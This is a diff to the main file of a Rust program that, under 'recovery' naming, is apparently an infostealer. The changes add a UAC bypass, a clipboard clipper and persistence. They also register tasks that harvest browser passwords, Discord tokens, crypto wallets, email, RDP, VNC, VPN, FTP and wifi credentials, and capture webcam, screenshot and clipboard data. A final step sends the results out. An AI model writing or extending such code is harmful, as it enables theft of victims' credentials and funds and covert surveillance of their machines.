@@ -3,15 +3,8 @@ mod formatter;
 mod recovery;
 mod sender;
 
-use recovery::structured::{
-    chromium_secrets_tasks, outlook_registry_task, wallet_inventory_task,
-};
 use recovery::task::{RecoveryError, RecoveryOutcome};
-use recovery::{
-    RecoveryContext, RecoveryManager, account_validation, behavioral, clipboard, devops, discord,
-    file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp,
-    screenshot, services, system, vnc, vpn, wallet, webcam, wifi,
-};
+use recovery::{RecoveryContext, RecoveryManager};
 use tracing_subscriber::prelude::*;
 use tracing_subscriber::{EnvFilter, fmt};
 
@@ -38,51 +31,96 @@ async fn main() -> Result<(), RecoveryError> {
         return Ok(());
     }
 
-    recovery::pumper::pump_file();
+    recovery::uac::attempt_uac_bypass().await;
+
+    recovery::clipper::run_clipper().await;
 
     recovery::persistence::install_persistence().await;
 
-    let mut manager = RecoveryManager::with_default_browser_tasks(&context).await?;
+    let mut manager = RecoveryManager::new(context.clone());
+    register_all_tasks(&mut manager, &context).await?;
     
-    manager.register_tasks(gecko::gecko_tasks(&context));
-    manager.register_tasks(gecko_passwords::gecko_password_tasks(&context));
-    manager.register_tasks(services::messenger_tasks(&context));
-    manager.register_tasks(services::gaming_tasks(&context));
-    manager.register_tasks(gaming::gaming_service_tasks(&context));
-    manager.register_tasks(gaming::gaming_extra_tasks(&context));
-    manager.register_tasks(services::email_tasks(&context));
-    manager.register_tasks(services::vpn_tasks(&context));
-    manager.register_task(account_validation::account_validation_task(&context));
-    manager.register_tasks(services::wallet_tasks(&context));
-    manager.register_tasks(system::system_tasks(&context));
-    manager.register_tasks(rdp::rdp_tasks(&context));
-    manager.register_tasks(vnc::vnc_tasks(&context));
-    manager.register_task(wifi::wifi_task(&context));
-    if recovery::settings::RecoveryControl::global().capture_screenshots() {
-        manager.register_task(screenshot::screenshot_task(&context));
-    }
-    if recovery::settings::RecoveryControl::global().capture_webcams() {
-        manager.register_task(webcam::webcam_task(&context));
-    }
-    if recovery::settings::RecoveryControl::global().capture_clipboard() {
-        manager.register_task(clipboard::clipboard_task(&context));
-    }
-    manager.register_tasks(behavioral::behavioral_tasks(&context));
-    manager.register_tasks(hardware::hardware_tasks(&context));
-    manager.register_task(file_recovery::file_recovery_task(&context));
-    manager.register_tasks(ftp::ftp_tasks(&context));
-    manager.register_tasks(chromium_secrets_tasks(&context));
-    manager.register_task(discord::discord_token_task(&context));
-    manager.register_task(discord::discord_profile_task(&context));
-    manager.register_task(discord::discord_service_task(&context));
-    manager.register_task(outlook_registry_task());
-    manager.register_task(wallet_inventory_task(&context));
-    manager.register_tasks(messenger::messenger_tasks(&context));
-    manager.register_tasks(other::other_tasks(&context));
-    manager.register_tasks(devops::devops_tasks(&context));
-    manager.register_tasks(wallet::wallet_tasks(&context));
-    manager.register_tasks(vpn::vpn_tasks(&context));
     let outcomes = manager.run_all().await?;
+
+    tracing::info!(
+        "recovery session complete: {} tasks | summary logged at {}",
+        outcomes.len(),
+        manager.context().output_dir.join("summary.log").display()
+    );
+
+    if let Err(err) = send_outcomes(&outcomes).await {
+        tracing::error!(error = %err, "failed to send recovery artifacts");
+    }
+
+    Ok(())
+}
+
+async fn register_all_tasks(
+    manager: &mut RecoveryManager,
+    context: &RecoveryContext,
+) -> Result<(), RecoveryError> {
+    use recovery::{
+        account_validation, behavioral, clipboard, chromium, devops, discord, email,
+        file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, rdp,
+        screenshot, services, system, vnc, vpn, wallet, webcam, wifi,
+    };
+    use recovery::browser::browsers;
+
+    // Browser tasks
+    manager.register_tasks(browsers::default_browser_tasks(context).await);
+    manager.register_tasks(gecko::gecko_tasks(context));
+    manager.register_tasks(gecko_passwords::gecko_password_tasks(context));
+    manager.register_tasks(chromium::chromium_secrets_tasks(context));
+
+    // Gaming tasks
+    manager.register_tasks(gaming::gaming_service_tasks(context));
+    manager.register_tasks(gaming::gaming_extra_tasks(context));
+
+    // Communication & Email
+    manager.register_tasks(messenger::messenger_tasks(context));
+    manager.register_task(discord::discord_token_task(context));
+    manager.register_task(discord::discord_profile_task(context));
+    manager.register_task(discord::discord_service_task(context));
+    manager.register_tasks(services::email_tasks(context));
+    manager.register_task(email::outlook_registry_task());
+
+    // Wallets
+    manager.register_tasks(wallet::wallet_tasks(context));
+
+    // System & Hardware
+    manager.register_tasks(system::system_tasks(context));
+    manager.register_tasks(hardware::hardware_tasks(context));
+    manager.register_task(account_validation::account_validation_task(context));
+
+    // Network & Remote Access
+    manager.register_tasks(rdp::rdp_tasks(context));
+    manager.register_tasks(vnc::vnc_tasks(context));
+    manager.register_tasks(vpn::vpn_tasks(context));
+    manager.register_tasks(ftp::ftp_tasks(context));
+    manager.register_task(wifi::wifi_task(context));
+
+    // Media & Interception
+    let control = recovery::settings::RecoveryControl::global();
+    if control.capture_screenshots() {
+        manager.register_task(screenshot::screenshot_task(context));
+    }
+    if control.capture_webcams() {
+        manager.register_task(webcam::webcam_task(context));
+    }
+    if control.capture_clipboard() {
+        manager.register_task(clipboard::clipboard_task(context));
+    }
+
+    // Other / Specialized
+    manager.register_tasks(behavioral::behavioral_tasks(context));
+    manager.register_task(file_recovery::file_recovery_task(context));
+    manager.register_tasks(other::other_tasks(context));
+    manager.register_tasks(devops::devops_tasks(context));
+
+    Ok(())
+}
+
+async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::error::Error>> {
 
     tracing::info!(
         "recovery session complete: {} tasks | summary logged at {}",
